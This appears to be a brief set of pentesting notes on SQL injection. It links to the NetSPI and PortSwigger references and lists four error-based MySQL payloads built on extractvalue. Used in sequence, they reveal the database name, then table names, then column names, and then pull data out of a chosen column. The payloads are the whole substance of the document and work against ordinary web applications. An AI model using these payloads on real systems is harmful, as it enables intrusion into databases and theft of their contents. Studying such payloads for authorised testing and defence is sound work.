# SQLi
### NetSPI:
https://sqlwiki.netspi.com/injectionTypes/errorBased/#mysql

### PortSwigger:
https://portswigger.net/web-security/sql-injection

### XPATH payloads:
* %' and extractvalue(rand(),concat(0x3a,(select database())));-- -
* %' and extractvalue(rand(),concat(0x3a,(select table_name from information_schema.tables where table_schema='<database_name>' limit 0,1)));-- -       ####:> will show only the first line of the table (0,1)
* %' and extractvalue(rand(),concat(0x3a,(select column_name from information_schema.columns where table_name='<table_name>' limit 0,1)));-- -          ####:> will show only the first column (0,1)
* %' and extractvalue(rand(),concat(0x3a,(select <column name> from <table name> limit 1)));-- -   ####:> will drop the information that you are looking for
